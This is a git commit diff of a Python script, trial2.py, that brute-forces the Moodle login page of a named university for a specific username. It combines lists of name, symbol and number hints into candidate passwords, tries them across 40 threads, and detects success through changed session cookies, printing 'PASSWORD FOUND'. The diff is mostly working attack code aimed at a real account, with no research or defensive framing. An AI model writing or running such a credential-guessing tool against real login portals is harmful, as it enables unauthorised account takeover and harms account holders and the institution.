710481c85d7e22cbd71739060d4852f4d3925a49
srikar.ch <srikar.0896@gmail.com>
2016-07-29 23:25:22 +0530

    Update trial2.py

--- trial2.py
+++ trial2.py
@@ -10,17 +10,25 @@ import os
 #Global Variables
 url="https://moodle.niituniversity.in/moodle/login/index.php"
 user="chowdavarapu.sriker"
-combinations=8*8*8*8*8*8*8*8
-print("Total possible combinations 900\n")
 timeExe = time.time()
 #res = itertools.permutations('srikar1.',8)
-arr1=["you hints here"]
-arr2=["Second set of hints"]
-arr3=[]
+arr1=["Your name hints"]   #like ["popoyye","killer","paulwalker"]
+arr2=["symbol hints"]  #like ["@",".","","#","$"]
+arr3=["Number hints"]  #like["1990","1884","6","0"]
+totalCombinations = len(arr1) * len(arr2) * len(arr3)
+print("\t\t\t\t\t\t\tUsername - " + str(user))
+print("\t\t\t\t\t\t\t\tPortal - Moodle\n")
+print("Name hints     - " + str(arr1))
+print("Symbol hints   - " + str(arr2))
+print("Number hints   - " + str(arr3))
+print(" [*] Total number of Combinations - " + str(totalCombinations) + "\n")
 
-for z in range(100):
-    arr3.append(str(z))
+#for z in range(100):    # Uncomment this if you want to try all the numbers between any two numbers and keep the range in place of 100
+ #   arr3.append(str(z))
+
 res=itertools.product(arr1,arr2,arr3)
+#which genates from the above examples arrays- all possible combinations with all given arrays like popoyye@1990 -to- paulwalker$0 
+
 Failscount = 0 
 
 #File Object
@@ -53,27 +61,34 @@ def passwordCracker(combination):
             if session1!=session2:
                 with print_lock:
                     #print("[+] PASSWORD FOUND - " + str(pas))
-                    sys.stdout.write("\r[+] PASSWORD FOUND - " + str(pas))
-                    print("Time Executed - " + str(timeExe - time.time()))
-                    print("Password found by " + str(threading.currnet_thread().name))
+                    sys.stdout.write("\r \n\n[+] PASSWORD FOUND - " + str(pas))
+                    print("\n    Time Executed - " + str(time.time() - timeExe))
+                    print("    Password found by " + str(threading.current_thread().name))
                     sys.stdout.flush()
-                sys.stdout.write("\n")
+                #sys.stdout.write("\n")
                 os._exit(1)
             else:
                 global Failscount
                 Failscount = Failscount + 1
                 with print_lock:
-                    sys.stdout.write("\r Fails - " + str(Failscount))
+                    sys.stdout.write("\rFails - " + str(Failscount))
                     sys.stdout.write(" [-] not match - " + str(pas))
                     sys.stdout.flush()
                 #sys.stdout.write("\n")
                     #print("[-] " + str(pas) + " not Match")
+                    if Failscount == totalCombinations:
+                        sys.stdout.write("\033[K")
+                        sys.stdout.flush()
+                        sys.stdout.write("\r\n\n [!] Bruteforce failed.")
+                        print("\n\n Time Elapsed - " + str(time.time() - timeExe) + "sec")
+                        os._exit(1)
     except Exception as e:
         #print(str(e) + "\n")
         time.sleep(5)
+        passwordCracker(combination)
 
 #Creating Threads
-for thread in range(100):
+for thread in range(40):
     th = threading.Thread(target=threader)
     th.daemon = True
     th.start()
